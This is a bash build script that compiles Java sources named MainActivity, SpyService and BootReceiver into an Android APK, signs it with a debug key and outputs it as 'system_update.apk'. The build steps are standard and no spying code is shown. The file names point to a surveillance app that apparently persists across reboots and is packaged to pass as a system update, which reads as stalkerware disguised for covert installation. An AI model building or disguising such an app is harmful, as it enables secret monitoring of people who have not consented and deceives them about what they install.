#!/bin/bash
set -e

# Set paths (Adjust these if your generic paths are different)
SDK_DIR="$HOME/Library/Android/sdk"
BUILD_TOOLS_VERSION="36.1.0" # Detected previously
BUILD_TOOLS="$SDK_DIR/build-tools/$BUILD_TOOLS_VERSION"
PLATFORM="$SDK_DIR/platforms/android-36/android.jar"

# Tools
AAPT2="$BUILD_TOOLS/aapt2"
D8="$BUILD_TOOLS/d8"
APKSIGNER="$BUILD_TOOLS/apksigner"
ZIPALIGN="$BUILD_TOOLS/zipalign"

# Ensure Java is available
if ! command -v javac &> /dev/null; then
    echo "CRITICAL ERROR: 'javac' command not found."
    echo "You must install the Java Development Kit (JDK) to build Android apps."
    echo "Try: brew install openjdk"
    exit 1
fi

echo "--- Setting up build directories ---"
rm -rf build
mkdir -p build/gen build/obj build/apk

echo "--- Compiling Java Sources ---"
javac -cp "$PLATFORM" -d build/obj \
    MainActivity.java SpyService.java BootReceiver.java

echo "--- Converting to DEX ---"
# D8 takes class files and produces classes.dex
# Note: implementation of d8 might vary, usually it accepts directory of classes or list of files
# We pass the root of classes with package structure? No, usually .class files.
find build/obj -name "*.class" > build/classes_list.txt
$D8 --output build/apk --lib "$PLATFORM" $(cat build/classes_list.txt)

echo "--- Linking Resources and Manifest ---"
# Create initial APK with Manifest
$AAPT2 link -o build/unsigned.apk -I "$PLATFORM" \
    --manifest AndroidManifest.xml \
    --java build/gen \
    --auto-add-overlay

echo "--- Packaging APK ---"
# Add classes.dex to the APK
cd build/apk
zip -u ../unsigned.apk classes.dex
cd ../..

echo "--- Aligning APK ---"
$ZIPALIGN -f -p 4 build/unsigned.apk build/aligned.apk

echo "--- Signing APK ---"
# Generate a debug key if missing
KEYSTORE="debug.keystore"
if [ ! -f "$KEYSTORE" ]; then
    echo "Generating debug keystore..."
    keytool -genkey -v -keystore "$KEYSTORE" -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Android Debug,O=Android,C=US"
fi

$APKSIGNER sign --ks "$KEYSTORE" --ks-pass pass:android --key-pass pass:android --out "system_update.apk" build/aligned.apk

echo "=== BUILD SUCCESSFUL ==="
echo "APK generated: system_update.apk"
